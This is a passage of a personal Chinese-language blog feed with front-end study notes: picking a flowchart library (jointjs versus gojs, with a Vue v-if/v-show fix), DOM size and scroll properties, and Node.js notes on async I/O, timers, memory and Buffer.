href="https://gojs.net/latest/samples/pageFlow.html" target="_blank" rel="noopener">https://gojs.net/latest/samples/pageFlow.html</a><br><a href="http://www.daviddurman.com/assets/autolayout.js" target="_blank" rel="noopener">http://www.daviddurman.com/assets/autolayout.js</a><br><a href="http://resources.jointjs.com/demos/layout" target="_blank" rel="noopener">http://resources.jointjs.com/demos/layout</a></p><p>———————————————更新 2018/8/30———————————————————-<br>经过一番实践，我觉得jointjs不好用了。<br>不满意点：</p><ol><li>不能相对容器自动布局，都用的是死的像素，分辨率低的屏幕，部分图有些就看不见<img src="/study/2018/8/procedure/joint-error.png"></li><li>不能滚动鼠标自己缩小放大</li><li>比较丑，也可能是我不会配色</li></ol><p>最终采用gojs,上面提到的问题解决方案是：把去掉水印的gojs放在自己的npm服务器上，这样就可以npm安装了！！！<br>实践过程中遇到个问题<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span>  <span class="attr">v-if</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>像这样，用<code>v-if</code>反复切换，会报错<code>Cannot read property &#39;type&#39; of undefined     at Po (go.js?d976:1044)</code></p><p>换成<code>v-show</code>就不会<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span>  <span class="attr">v-show</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>但是这样的前提是show初始化是true.如果初始化为false,没有报错，但是图呈现不出来。<br>原因我猜测是：show初始化为false,组件高度为0，因为默认画布就是组件容器，所以画布高度变成0，图画不出。</p><p>最后想出个方法。<code>v-if</code>和<code>v-show</code>结合一起使用，加上<code>$once</code>方法，代码：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">process-go</span> <span class="attr">style</span>=<span class="string">"height:250px"</span> <span class="attr">v-if</span>=<span class="string">"firstClick"</span> <span class="attr">v-show</span>=<span class="string">"show"</span>  <span class="attr">:model-data</span>=<span class="string">"dataObj.graph"</span> <span class="attr">:category</span>=<span class="string">"category"</span>&gt;</span> <span class="tag">&lt;/<span class="name">process-go</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">data()&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;        </span><br><span class="line">        show:<span class="literal">false</span>,</span><br><span class="line">        firstClick:<span class="literal">false</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">created()&#123;</span><br><span class="line">    <span class="keyword">this</span>.init();</span><br><span class="line">    <span class="keyword">this</span>.$once(<span class="string">'firstClick'</span>,()=&gt;&#123;</span><br><span class="line">        <span class="keyword">this</span>.firstClick = <span class="literal">true</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;,</span><br><span class="line">methods:&#123;</span><br><span class="line">    init()&#123;...&#125;,</span><br><span class="line">    look()&#123;<span class="comment">//用v-if切换会报错，只有第一次点击查看用v-if,其他用v-show</span></span><br><span class="line">        <span class="keyword">this</span>.$emit(<span class="string">'firstClick'</span>);</span><br><span class="line">        <span class="keyword">this</span>.show = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重新封装了一下gojs 地址：<a href="https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue" target="_blank" rel="noopener">https://github.com/LRY1994/vue-lib/blob/master/src/components/process-go/index.vue</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;因为公司项目需求，要画出相关业务的流程图，以便客户了解自己身处何处&lt;/p&gt;
&lt;p&gt;搜索框输入 “前端流程图插件”，查了很多资料，总结一下有以下几种&lt;/p&gt;
&lt;h3 id=&quot;Raphael&quot;&gt;&lt;a href=&quot;#Raphael&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>尺寸</title>
    <link href="http://lry1994.github.io/study/Comprehensive/visible-area.html"/>
    <id>http://lry1994.github.io/study/Comprehensive/visible-area.html</id>
    <published>2018-07-11T16:00:00.000Z</published>
    <updated>2018-10-08T01:18:27.755Z</updated>
    
    <content type="html"><![CDATA[<h2 id="HTML元素精准定位"><a href="#HTML元素精准定位" class="headerlink" title="HTML元素精准定位"></a>HTML元素精准定位</h2><p><code>scrollHeight</code>: 对象的滚动高度。 </p><p><code>scrollLeft</code>:对象左边界和窗口中目前可见内容的最左端之间的距离</p><p><code>scrollTop</code>:对象最顶端和窗口中可见内容的最顶端之间的距离 </p><p><code>scrollWidth</code>:获取对象的滚动宽度</p><p><code>offsetHeight</code>:获取对象相对于版面或由父坐标 offsetParent 属性指定的父坐标的高度 </p><p><code>offsetLeft</code>:获取对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 </p><p><code>offsetTop</code>:获取对象相对于版面或由 offsetTop 属性指定的父坐标的计算顶端位置 </p><p><code>event.clientX</code> 相对文档的水平座标 </p><p><code>event.clientY</code> 相对文档的垂直座标 </p><p><code>event.offsetX</code> 相对容器的水平坐标 </p><p><code>event.offsetY</code> 相对容器的垂直坐标 </p><p><code>document.documentElement.scrollTop</code> 垂直方向滚动的值 </p><p><code>event.clientX+document.documentElement.scrollTop</code> 相对文档的水平座标+垂直方向滚动的量</p><p>这里是JavaScript中建造迁移转变代码的常用属性</p><p>页可见区域宽： <code>document.body.clientWidth</code>;</p><p>网页可见区域高： <code>document.body.clientHeight</code>;</p><p>网页可见区域宽： <code>document.body.offsetWidth</code>  （包含边线的宽）;</p><p>网页可见区域高： <code>document.body.offsetHeight</code> （包含边线的宽）;</p><p>网页正文全文宽： <code>document.body.scrollWidth</code>;</p><p>网页正文全文高： <code>document.body.scrollHeight</code>;</p><p>网页被卷去的高： <code>document.body.scrollTop</code>;</p><p>网页被卷去的左： <code>document.body.scrollLeft</code>;</p><p>网页正文项目组上： <code>window.screenTop</code>;</p><p>网页正文项目组左： <code>window.screenLeft</code>;</p><p>屏幕辨别率的高： <code>window.screen.height</code>;</p><p>屏幕辨别率的宽： <code>window.screen.width</code>;</p><p>屏幕可用工作区高度： <code>window.screen.availHeight</code>;</p><img src="/study/Comprehensive/visible-area/element-position.gif"><h2 id="screen对象"><a href="#screen对象" class="headerlink" title="screen对象"></a>screen对象</h2><p>用于获取用户的屏幕信息。</p><ul><li><p><code>screen.availWidth</code> 属性返回访问者屏幕的宽度，以像素计，减去界面特性，比如任务栏。</p></li><li><p><code>screen.availHeight</code> 属性返回访问者屏幕的高度，以像素计，减去界面特性，比如任务栏。</p></li></ul><h2 id="浏览器窗口可视区域大小"><a href="#浏览器窗口可视区域大小" class="headerlink" title="浏览器窗口可视区域大小"></a>浏览器窗口可视区域大小</h2><p>获得浏览器窗口的尺寸（浏览器的视口，不包括工具栏和滚动条）的方法:</p><h4 id="一、对于IE9-、Chrome、Firefox、Opera-以及-Safari："><a href="#一、对于IE9-、Chrome、Firefox、Opera-以及-Safari：" class="headerlink" title="一、对于IE9+、Chrome、Firefox、Opera 以及 Safari："></a>一、对于IE9+、Chrome、Firefox、Opera 以及 Safari：</h4><ul><li><code>window.innerHeight</code> - 浏览器窗口的内部高度</li><li><code>window.innerWidth</code>- 浏览器窗口的内部宽度</li></ul><h4 id="二、对于-Internet-Explorer-8、7、6、5："><a href="#二、对于-Internet-Explorer-8、7、6、5：" class="headerlink" title="二、对于 Internet Explorer 8、7、6、5："></a>二、对于 Internet Explorer 8、7、6、5：</h4><ul><li><p><code>document.documentElement.clientHeight</code>表示HTML文档所在窗口的当前高度。</p></li><li><p><code>document.documentElement.clientWidth</code>表示HTML文档所在窗口的当前宽度。</p></li></ul><p>或者</p><p>Document对象的body属性对应HTML文档的<code>&lt;body&gt;</code>标签</p><ul><li><p><code>document.body.clientHeight</code></p></li><li><p><code>document.body.clientWidth</code></p></li></ul><h4 id="三、浏览器兼容性"><a href="#三、浏览器兼容性" class="headerlink" title="三、浏览器兼容性"></a>三、浏览器兼容性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w= <span class="built_in">document</span>.documentElement.clientWidth</span><br><span class="line">      || <span class="built_in">document</span>.body.clientWidth;</span><br><span class="line"><span class="keyword">var</span> h= <span class="built_in">document</span>.documentElement.clientHeight</span><br><span class="line">      || <span class="built_in">document</span>.body.clientHeight;</span><br></pre></td></tr></table></figure><h2 id="网页尺寸scrollHeight"><a href="#网页尺寸scrollHeight" class="headerlink" title="网页尺寸scrollHeight"></a>网页尺寸scrollHeight</h2><p><code>scrollHeight</code>和<code>scrollWidth</code>，获取网页内容高度和宽度。</p><h4 id="一、针对IE、Opera"><a href="#一、针对IE、Opera" class="headerlink" title="一、针对IE、Opera:"></a>一、针对IE、Opera:</h4><p>scrollHeight 是网页内容实际高度，可以小于 clientHeight。</p><h4 id="二、针对NS、FF"><a href="#二、针对NS、FF" class="headerlink" title="二、针对NS、FF:"></a>二、针对NS、FF:</h4><p>scrollHeight 是网页内容高度，不过最小值是 clientHeight。也就是说网页内容实际高度小于 clientHeight 时，scrollHeight 返回 clientHeight 。</p><h4 id="三、浏览器兼容性-1"><a href="#三、浏览器兼容性-1" class="headerlink" title="三、浏览器兼容性"></a>三、浏览器兼容性</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w=<span class="built_in">document</span>.documentElement.scrollWidth</span><br><span class="line">   || <span class="built_in">document</span>.body.scrollWidth;</span><br><span class="line"><span class="keyword">var</span> h=<span class="built_in">document</span>.documentElement.scrollHeight</span><br><span class="line">   || <span class="built_in">document</span>.body.scrollHeight;</span><br></pre></td></tr></table></figure><p><code>scrollHeight</code>和<code>scrollWidth</code>还可获取Dom元素中内容实际占用的高度和宽度。</p><h2 id="网页尺寸offsetHeight"><a href="#网页尺寸offsetHeight" class="headerlink" title="网页尺寸offsetHeight"></a>网页尺寸offsetHeight</h2><p><code>offsetHeight</code>和<code>offsetWidth</code>，获取网页内容高度和宽度(包括滚动条等边线，会随窗口的显示大小改变)。</p><h4 id="一、值"><a href="#一、值" class="headerlink" title="一、值"></a>一、值</h4><p><code>offsetHeight = clientHeight + 滚动条 + 边框。</code></p><p>####二、浏览器兼容性<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> w= <span class="built_in">document</span>.documentElement.offsetWidth</span><br><span class="line">    || <span class="built_in">document</span>.body.offsetWidth;</span><br><span class="line"><span class="keyword">var</span> h= <span class="built_in">document</span>.documentElement.offsetHeight</span><br><span class="line">    || <span class="built_in">document</span>.body.offsetHeight;</span><br></pre></td></tr></table></figure></p><h2 id="网页卷去的距离与偏移量"><a href="#网页卷去的距离与偏移量" class="headerlink" title="网页卷去的距离与偏移量"></a>网页卷去的距离与偏移量</h2><p>我们先来看看下面的图：</p><img src="/study/Comprehensive/visible-area/scroll.png"><p><code>scrollLeft</code>:设置或获取位于给定对象左边界与窗口中目前可见内容的最左端之间的距离 ，即左边灰色的内容。</p><p><code>scrollTop</code>:设置或获取位于对象最顶端与窗口中可见内容的最顶端之间的距离,即网页被卷去的高，即上边灰色的内容。向上滚动的距离</p><p><code>offsetLeft</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算左侧位置 。</p><p><code>offsetTop</code>:获取指定对象相对于版面或由 offsetParent 属性指定的父坐标的计算顶端位置 。</p><p>注意:</p><ol><li>区分大小写</li><li>offsetParent：布局中设置postion属性(Relative、Absolute、fixed)的父容器，从最近的父节点开始，一层层向上找，直到HTML的body。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;HTML元素精准定位&quot;&gt;&lt;a href=&quot;#HTML元素精准定位&quot; class=&quot;headerlink&quot; title=&quot;HTML元素精准定位&quot;&gt;&lt;/a&gt;HTML元素精准定位&lt;/h2&gt;&lt;p&gt;&lt;code&gt;scrollHeight&lt;/code&gt;: 对象的滚动高度。 &lt;/
      
    
    </summary>
    
      <category term="学习" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="专题笔记" scheme="http://lry1994.github.io/categories/%E5%AD%A6%E4%B9%A0/%E4%B8%93%E9%A2%98%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="面试" scheme="http://lry1994.github.io/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>《深入浅出node.js》、慕课网</title>
    <link href="http://lry1994.github.io/study/2018/7/node.html"/>
    <id>http://lry1994.github.io/study/2018/7/node.html</id>
    <published>2018-07-04T16:00:00.000Z</published>
    <updated>2018-08-30T02:32:56.373Z</updated>
    
    <content type="html"><![CDATA[<h1 id="《深入浅出node-js》"><a href="#《深入浅出node-js》" class="headerlink" title="《深入浅出node.js》"></a>《深入浅出node.js》</h1><p>适合高并发、IO密集型、事件驱动</p><ul><li><p>服务端</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">http.createServer(<span class="function"><span class="keyword">function</span>(<span class="params">ServerRequest, ServerResponse</span>)</span>&#123;</span><br><span class="line">    <span class="comment">//监听</span></span><br><span class="line">    ServerRequest.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">chunk</span>)</span>&#123;&#125;)</span><br><span class="line">    ServerRequest.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    ServerRequest.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    <span class="comment">//响应</span></span><br><span class="line">    ServerResponse.writeHead(<span class="number">200</span>,&#123;<span class="string">'Content-Type'</span>:<span class="string">'text/plain'</span>&#125;)</span><br><span class="line">    ServerResponse.write(<span class="string">'hello'</span>)</span><br><span class="line">    ServerResponse.end()</span><br><span class="line">&#125;).listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure></li><li><p>客户端</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">options = &#123;</span><br><span class="line">    host:<span class="string">''</span>,</span><br><span class="line">    hostname</span><br><span class="line">    localAdrress</span><br><span class="line">    socketPath</span><br><span class="line">    auth</span><br><span class="line">    agent</span><br><span class="line">    keepAlive</span><br><span class="line">    keepAliveMsecs</span><br><span class="line">    port:<span class="string">''</span>,</span><br><span class="line">    method:<span class="string">''</span>,</span><br><span class="line">    path:<span class="string">''</span>,</span><br><span class="line">    headers:<span class="string">''</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> clientRequest = http.request(options,<span class="function"><span class="keyword">function</span>(<span class="params">clientResponse</span>)</span>&#123;</span><br><span class="line">    clientResponse.setEncoding()</span><br><span class="line">    clientResponse.pause()</span><br><span class="line">    clientResponse.resume()</span><br><span class="line">    clientResponse.on(<span class="string">'data'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(Buffer.isBuffer(chunk));<span class="comment">//true</span></span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">typeof</span> chunk)<span class="comment">//Object</span></span><br><span class="line">    &#125;)<span class="comment">//不断被触发,流</span></span><br><span class="line">    clientResponse.on(<span class="string">'end'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line">    clientResponse.on(<span class="string">'close'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">clientRequest.write(请求体)</span><br><span class="line">clientRequest.end()</span><br><span class="line">clientRequest.on(<span class="string">'error'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="built_in">console</span>.log(e.message)&#125;)</span><br><span class="line">clientRequest.abort()</span><br><span class="line">clientRequest.setTimeout()</span><br><span class="line">clientRequest.setNoDelay()</span><br></pre></td></tr></table></figure></li></ul><h2 id="文件加载方式"><a href="#文件加载方式" class="headerlink" title="文件加载方式"></a>文件加载方式</h2><blockquote><p>按路径加载</p></blockquote><pre><code>require以&apos;/&apos;开头的，以绝对路径方式加载require以&apos;./&apos;或&apos;../&apos;开头的，以相对路径加载</code></pre><blockquote><p>查找node_modules文件夹</p></blockquote><pre><code>在当前目录下的node_modules中查找=&gt;父目录node_modules找=&gt;上一层目录的node_modules找。。。。。一层一层向上</code></pre><h2 id="异步I-O原理"><a href="#异步I-O原理" class="headerlink" title="异步I/O原理"></a>异步I/O原理</h2><p>事实上，javascript是单线程的，<strong>Node自身其实是多线程的</strong>，只是I/O线程使用的CPU较少。<br>除了用户代码无法并行执行外，所有的I/O（磁盘I/O和网络I/O等）都是可以并行执行的。</p><img src="/study/2018/7/node/async-io.png"><h2 id="非I-O异步的方法"><a href="#非I-O异步的方法" class="headerlink" title="非I/O异步的方法"></a>非I/O异步的方法</h2><p>非I/O异步的方法：<code>setTimeout</code>,<code>setInterval</code>,<code>setImmediate</code>,<code>process.nextTick</code></p><h3 id="setTimeout-setInterval"><a href="#setTimeout-setInterval" class="headerlink" title="setTimeout,setInterval"></a><code>setTimeout</code>,<code>setInterval</code></h3><pre><code>调用``setTimeout``,``setInterval``创建的定时器会被插入到定时器观察者内部的一个红黑树里面。每次Tick执行，就从改红合数中迭代去除定时器对象，检查是否超过定时时间。如果超过，就形成一个事件，回调函数立即执行{% asset_img setTimeout.png %}</code></pre><h3 id="process-nextTick-VS-setTimeout-function-0"><a href="#process-nextTick-VS-setTimeout-function-0" class="headerlink" title="process.nextTick VS setTimeout(function(){},0)"></a><code>process.nextTick</code> VS <code>setTimeout(function(){},0)</code></h3><pre><code>立即执行一个异步任务可以用``process.nextTick``。``setTimeout(function(){},0)``需要动用到红黑树，创建定时器对象和迭代操作等操作，较浪费性能，复杂度为O(lg(n)。nextTick只会将回调函数放入队列中，在下一轮Tick时取出执行，复杂度为O(1)。</code></pre><h3 id="setImmediate-VS-process-nextTick"><a href="#setImmediate-VS-process-nextTick" class="headerlink" title="setImmediate  VS process.nextTick"></a><code>setImmediate</code>  VS <code>process.nextTick</code></h3><pre><code>``process.nextTick``优先级大于 ``setImmediate`` 。因为时间循环对观察者的检查是有先后顺序的，``process.nextTick``属于idle观察者，``setImmediate``属于check观察者。在每一个时间循环检查中，**观察者检查顺序：idle---I/O---check**``process.nextTick``的回调保存在一个**数组**中。``setImmediate``的回调保存在一个**链表**中``process.nextTick``在一个事件循环中会将所有回调函数全部执行完。``setImmediate``每一个时间循环只会执行一个回调。</code></pre><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><pre><code>对异步方法进行try/catch操作只可以捕获**当次**事件循环里面的异常solution:Node在处理异常上形成一种约定，将异常作为回调函数的第一个实参传回。需要睡眠阻塞代码调用setTimeout更好，不要用下面的代码.这段代码会持续占用CPU，与真正的sleep相去甚远<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> s =<span class="keyword">new</span> <span class="built_in">Date</span>();</span><br><span class="line"><span class="keyword">while</span>(neW <span class="built_in">Date</span>()-s&lt;<span class="number">100</span>)&#123;&#125;</span><br></pre></td></tr></table></figure></code></pre><h3 id="异步编程解决方案"><a href="#异步编程解决方案" class="headerlink" title="异步编程解决方案"></a>异步编程解决方案</h3><p>EventProxy 是对 events.EventEmitter 的补充，可以自由订阅组合事件</p><ul><li><p>EventProxy:<br>  all,<br>  tail,<br>  after,<br>  fail,<br>  done(传入all)</p></li><li><p>promise/deferred</p></li></ul><img src="/study/2018/7/node/promise-deferred.png"><h4 id="流程控制库"><a href="#流程控制库" class="headerlink" title="流程控制库"></a>流程控制库</h4><ul><li><p>async</p><p>  series 只适合无依赖的串行执行，若当前一个的结果是后一个调用的输入的时候，就不能满足需求.</p><p>  parallel 并行</p><p>  waterfall 有依赖的串行执行</p><p>  auto 可以根据依赖关系自动分析，以最佳的顺序执行业务</p><p>  queue 动态添加并行任务</p><p>  parallelLimit 无法动态添加并行任务</p></li><li><p>step</p></li><li><p>wind 做到了不阻塞CPU但阻塞代码的目的</p></li><li><p>bagPipe:对异步API添加过载保护。可以添加任意类型的异步任务，也可以动态添加异步任务，还能够在实时处理场景中加入拒绝模式（若等待的队列也慢了，新来的调用就直接返回一个队列太满的拒绝异常）和超时控制</p></li></ul><h2 id="内存"><a href="#内存" class="headerlink" title="内存"></a>内存</h2><p>V8 的垃圾回收会引起Javascript线程<code>暂停执行</code>，回收的内存越多，时间就会被耽搁得越长。所以造成了V8的内存限制。</p><ul><li><p>通过赋值方式解除引用更好</p><p>  想主动释放变量，可以通过delete或者重新赋值进行删除。但是在V8中delete操作有可能干扰V8的优化，所以通过赋值方式解除引用更好</p>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> global.foo ;</span><br><span class="line">global.foo = <span class="literal">undefined</span><span class="comment">//or null</span></span><br></pre></td></tr></table></figure></li><li><p>在正常的Javascript中，无法立即回收的有<code>闭包</code>和<code>全局变量引用</code>这两种情况</p></li><li><p>闭包<br>  实现外部作用域访问内部作用域变量</p><p>  它的问题在于，一旦有变量引用了这个中间函数，这个中间函数将不会释放，同事会使原始的作用域也得不到释放，作用域中产生的内存占用也不会得到释放。除非不再有引用，才会逐步释放</p></li><li><p>内存</p><p>  进程的内存包括rss(常驻内存)、交换区swap中一部分和文件系统中一部分</p>  <img src="/study/2018/7/node/v8-heap.png"><p>  Node的内存使用并非都是通过V8进行分配的，那些不是通过V8进行分配的内存叫做 <strong>堆外内存</strong>.利用堆外内存可以突破内存限制</p><p> 堆外内存 + v8堆内存(<code>process.memoryUsage()</code>) = rss</p><p> Buffer对象不经过V8的内存分配机制</p><p> 内存泄露的实质只有一个：就是应当回收的对象出现意外而没有被回收，变成了常驻在老生代中的对象。原因有：</p><ol><li>缓存（相当于全局变量保存一些东西）保存太多，没有过期淘汰策略。解决方案：使用进程外的缓存，进程自身不存储。</li><li>队列消费不及时。解决方案：需要有拒绝策略和超时策略</li><li><p>作用域未释放</p><p>stream模块用于处理大文件。如果不需要字符串层面的操作，则不需要借助V8来处理，可以尝试纯粹的Buffer来操作，这就不会受到V8的堆内存限制。但是这个大片使用内存的情况依然要小心，即使V8不限制堆内存的大小，物理内存依然有限制</p></li></ol></li></ul><h2 id="Buffer"><a href="#Buffer" class="headerlink" title="Buffer"></a>Buffer</h2><p>Node在内存的使用上采用的是在C++层面<strong>申请</strong>内存、在Javascript中<strong>分配</strong>内存的策略。</p><p>宽字节字符串被截断的问题可以用setEncoding()解决。原因在于，在调用setEncoding()的时候，可读流对象在内部设置了一个decoder对象。每次data事件都通过该decoder对象进行Buffer到字符串的解码，然后再进行下一步。decoder来自于string_decoder模块的StringDecoder实例对象，StringDecoder知道编码后会自行决定输出哪些字节，不输出哪些字节，保证字节不会被截断。但是setEncoding不能从根本上解决该问题。</p><p>更好的解决方法是把多个小Buffer对象拼接成一个Buffer对象（concat方法），然后通过iconv-lite一类的模块来转码。</p><h2 id="TCP"><a href="#TCP" class="headerlink" title="TCP"></a>TCP</h2><p>在node中，TCP默认启用Nagle算法，要求缓冲区的数据达到一定数量或一定时间后才将其发出，所以小数据包会被合并，优化网络。<br>可以调用socket.setNoDelay(true)取消Nagle算法，使得write()可以立即发送数据到网络中。<br>并不是每次write()都会触发一次data事件。在关闭掉Nagle后，另一端可能会将接收到的多个小数据包合并，然后只触发一次data事件.</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>事件驱动的实质：主循环+事件触发</p><p>为了充分利用浏览器缓存，提高页面的加载速度，在生产环境中常常会向静态文件的文件名添加MD5戳，即使用bundle_[hash].js,而不是bundle.js。<br>这里的[hash]会在构建时被盖chunk内容的MD5结果替换，以实现内容不变则文件名不变的效果。</p><p>幂等 ：重复请求多次与请求一次的效果是一样的。</p><p>Node模块分为<strong>核心模块</strong>和<strong>文件模块</strong></p><p>文件模块没有扩展名时，会按照顺序优先加上后缀 <code>.js=&gt;.json=&gt;.ndoe</code></p><ul><li><p>url网址解析</p><p>  <code>url.parse(string,bool,bool)</code> URL字符串=&gt;解析对象</p><p>  <code>url.format(obj)</code> 解析对象=&gt;URL</p><p>  <code>url.resolve(a,b)</code> 连接</p></li></ul><ul><li><p>querystring 参数处理小利器</p><p>  <code>querystring.parse</code> 字符串=&gt;JSON 反序列化</p><p>  <code>querystring.stringify</code> JSON=&gt;字符串 序列化</p><p>  <code>querystring.escape</code> 编码转义</p><p>  <code>querystring.unescape</code></p></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server = <span class="keyword">new</span> HttpServer()</span><br><span class="line"></span><br><span class="line">server.on(<span class="string">'request'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;&#125;)</span><br><span class="line"><span class="comment">//上面一句相当于=&gt;</span></span><br><span class="line">server.listen(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure><h1 id="慕课网"><a href="#慕课网" class="headerlink" title="慕课网"></a>慕课网</h1><ul><li>DNS查找过程</li></ul><ol><li>浏览器搜索自身的DNS缓存</li><li>搜索操作系统自身的DNS缓存</li><li>读取本地的HOST文件</li><li>浏览器发起一个DNS系统调用</li><li>宽带运营商服务器查看本身缓存</li><li>运营商服务器发起迭代DNS解析的请求</li></ol><h3 id="HTTP模块"><a href="#HTTP模块" class="headerlink" title="HTTP模块"></a>HTTP模块</h3><pre><code>什么是回调？什么是同步/异步？什么是I/O？什么是单线程/多线程？什么是阻塞/非阻塞？什么是事件？什么是事件驱动？什么是基于事件驱动的回调？什么是事件循环？</code></pre><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> pet = &#123;</span><br><span class="line">    speak :<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span> ===pet)<span class="comment">//true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pet</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span 